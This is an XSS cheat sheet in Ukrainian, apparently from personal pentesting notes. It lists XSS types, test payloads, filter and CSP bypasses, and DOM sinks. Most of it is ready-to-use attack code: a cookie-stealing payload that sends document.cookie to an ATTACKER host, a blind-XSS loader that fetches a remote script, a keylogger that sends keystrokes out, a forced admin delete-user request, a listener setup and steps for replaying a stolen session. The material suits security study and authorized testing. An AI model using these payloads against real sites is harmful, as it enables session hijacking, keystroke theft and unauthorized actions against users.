# Cross-Site Scripting (XSS)

## Типи

| Тип | Де зберігається | Як спрацьовує |
|-----|----------------|---------------|
| **Reflected** | ніде — у відповіді на запит | жертва клікає на посилання з payload |
| **Stored** | в БД / на сервері | зберігається, спрацьовує для всіх хто відкриє сторінку |
| **DOM-based** | ніде — JavaScript читає DOM | payload виконується в браузері через JS, не проходить через сервер |

---

## Базові перевірки

```html
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)
```

---

## Filter Bypass

```html
<!-- Регістр -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- Без пробілів між атрибутами -->
<img/src=x/onerror=alert(1)>

<!-- Кодування -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="javascript:&#97;lert(1)">click</a>

<!-- Протокол -->
<a href="jAvAsCrIpT:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>

<!-- Event handlers (якщо script тег блокований) -->
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Template literal / backtick (обхід лапок) -->
<img src=x onerror=`alert(1)`>

<!-- Коментарі для обриву контексту -->
--><script>alert(1)</script>
*/alert(1)/*
```

---

## DOM XSS

```javascript
// Шукай у JS-коді небезпечні sink'и:
document.write(...)
document.innerHTML = ...
eval(...)
setTimeout(...)
location.href = ...
location.hash
window.name
document.URL

// Перевірка: що читається з URL?
// Якщо: location.hash → підстав: #<img src=x onerror=alert(1)>
// Якщо: URLSearchParams → підстав: ?name=<script>alert(1)</script>
```

---

## CSP Bypass

```
# Переглянь заголовок:
Content-Security-Policy: script-src 'self' https://cdn.example.com

# Якщо є unsafe-inline → звичайний XSS
# Якщо є довірений домен що дозволяє upload → завантаж JS туди
# Якщо є nonce → потрібно його передбачити (зазвичай неможливо)
# Якщо немає CSP взагалі → немає обмежень
```

JSONP endpoint на довіреному домені — класичний CSP bypass:
```html
<script src="https://trusted.com/api/callback?cb=alert(1)"></script>
```

---

## Cookie Stealing (Reflected / Stored)

```html
<script>
new Image().src='http://ATTACKER/steal?c='+encodeURIComponent(document.cookie);
</script>
```

```html
<!-- Компактніший варіант для stored XSS -->
<img src=x onerror="fetch('http://ATTACKER/'+document.cookie)">
```

На атакері:
```bash
python3 -m http.server 80
# або nc -lvnp 80 | grep "GET /"
```

Отриманий cookie → встановити в браузері через DevTools → Console:
```javascript
document.cookie = "session=STOLEN_VALUE; path=/"
```

---

## Blind XSS (не бачиш відповіді)

Використовується коли XSS спрацює в адмін-панелі або логах.

```html
<!-- XSSHunter-style payload: звітує назад коли виконається -->
<script src="http://ATTACKER/xss.js"></script>
```

`xss.js` на атакері:
```javascript
new Image().src="http://ATTACKER/log?u="+encodeURIComponent(document.URL)
             +"&c="+encodeURIComponent(document.cookie)
             +"&h="+encodeURIComponent(document.referrer);
```

---

## Keylogger через XSS

```html
<script>
document.onkeypress = function(e){
  new Image().src='http://ATTACKER/k?k='+String.fromCharCode(e.which);
}
</script>
```

---

## XSS → CSRF (дія від імені жертви)

```html
<script>
fetch('/admin/delete-user', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'user_id=42'
});
</script>
```

---

## Перевірка httpOnly на cookie

```javascript
// В консолі браузера:
document.cookie   // якщо порожньо → cookie має HttpOnly, не краде через JS
// Але й далі можна зробити: XSS → дія від імені (CSRF), keylogging, UI redress
```

---

## Checklist пошуку XSS

```
[ ] Всі input поля: form, search, comment, username, profile
[ ] URL-параметри відображаються на сторінці?
[ ] HTTP заголовки (User-Agent, Referer, X-Forwarded-For) логи → Stored blind XSS
[ ] JSON відповіді що вставляються в DOM через innerHTML
[ ] Error messages (404, validation)
[ ] File upload — ім'я файлу відображається?
```

**Зв'язки:** [[Web-Attacks-IDOR-XXE-Verb]] · [[File-Upload-Attacks]] · [[Common-Apps]]
